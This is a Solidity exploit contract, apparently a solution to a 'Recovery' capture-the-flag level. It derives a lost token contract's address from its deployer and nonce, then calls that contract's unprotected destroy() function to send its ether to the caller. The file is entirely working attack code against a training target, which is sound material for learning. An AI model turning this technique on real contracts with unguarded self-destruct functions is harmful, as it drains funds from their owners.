// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/Recovery/Recovery.sol";

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract RecoveryExploit {
    Recovery victim;

    constructor(address _victim) {
        victim = Recovery(payable(_victim));
    }

    function hack() public {
        address tokenAddress = computeAddress(address(victim), 1);
        ISimpleToken(tokenAddress).destroy(payable(msg.sender));
    }

    function computeAddress(address deployer, uint256 nonce) public pure returns (address) {
        if (nonce == 0x00) {
            return address(uint160(uint(keccak256(abi.encodePacked(
                hex"d6",
                hex"94",
                deployer,
                hex"80"
            )))));
        } else if (nonce <= 0x7f) {
            return address(uint160(uint(keccak256(abi.encodePacked(
                hex"d6",
                hex"94",
                deployer,
                uint8(nonce)
            )))));
        } else if (nonce <= 0xff) {
            return address(uint160(uint(keccak256(abi.encodePacked(
                hex"d7",
                hex"94",
                deployer,
                hex"81",
                uint8(nonce)
            )))));
        } else if (nonce <= 0xffff) {
            return address(uint160(uint(keccak256(abi.encodePacked(
                hex"d8",
                hex"94",
                deployer,
                hex"82",
                uint16(nonce)
            )))));
        } else if (nonce <= 0xffffff) {
            return address(uint160(uint(keccak256(abi.encodePacked(
                hex"d9",
                hex"94",
                deployer,
                hex"83",
                uint24(nonce)
            )))));
        } else {
            return address(uint160(uint(keccak256(abi.encodePacked(
                hex"da",
                hex"94",
                deployer,
                hex"84",
                uint32(nonce)
            )))));
        }
    }

    receive() external payable {
    }
}